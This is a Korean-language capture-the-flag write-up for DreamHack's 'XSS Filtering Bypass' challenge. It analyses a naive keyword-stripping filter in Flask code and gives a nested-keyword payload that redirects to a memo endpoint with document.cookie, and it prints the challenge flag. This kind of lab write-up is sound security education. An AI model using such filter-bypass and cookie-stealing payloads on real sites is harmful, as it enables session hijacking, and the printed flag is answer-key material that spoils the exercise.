# [DreamHack] XSS Filtering Bypass

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exercise: XSS Filtering Bypass에서 실습하는 문제입니다.
>
> Release: [XSS Filtering Bypass.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8617420/XSS.Filtering.Bypass.zip)

## Analysis

### /vuln

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param
```

`param` 변수에 값을 전달받아서, `xss_filter()`를 호출한다.

```python
def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text
```

`xss_filter()`는 인자로 들어온 `text`에서 `script`, `on`, `javascript` 문자열을 차례로 검색해서 제거한 후 그 결과를 반환한다.

그런데 만약 `scripont`라는 문자열이 있으면, `script`를 검색할 때는 걸리지 않고 그 다음에 `on`이 삭제되면 `script`가 되어서, `vuln()`에서는 `<script>` 태그를 사용한 XSS가 가능하다.

### /flag

```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'
```

`param`과 플래그를 인자로 전달하여 `check_xss()`를 호출한다.

```python
def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
```

`check_xss()`는 서버에서 `/vuln?param={param}`로 접속 요청을 보내고, 이때 두 번째 인자로 받은 쿠키를 세팅한다. 즉, 플래그를 쿠키에 담아서 접속 요청을 보내게 된다.

### /memo

```python
memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)
```

전달받은 `memo` 변수의 값을 `memo_text`에 추가하고, `memo_text`의 전체 내용을 화면에 출력한다.

## Exploit

서버의 입장에서 쿠키에 플래그가 저장되어 있으므로, `/memo?memo=`에 `document.cookie`의 값을 넣어서 접속 요청을 보내도록 만들면, `memo_text`에 플래그가 추가된다.

따라서, `/flag`에서 `param`에 `<scripont>document.locatioonn.href='/memo?memo='+document.cookie</scripont>`을 넣으면, 필터링을 거친 후에 `<script>document.location.href='/memo?memo='+document.cookie</script>`가 되어, 요청을 보내고 나서 `/memo`에 들어가보면 플래그를 획득할 수 있다.

![image](https://user-images.githubusercontent.com/104156058/166637556-4ff54204-cceb-4e65-87f2-a50bc1ed96e9.png)

![image](https://user-images.githubusercontent.com/104156058/166637665-13fd0587-1271-444f-abc2-ac42c4156590.png)

```
flag: DH{81cd7cb24a49ad75b9ba37c2b0cda4ea}
```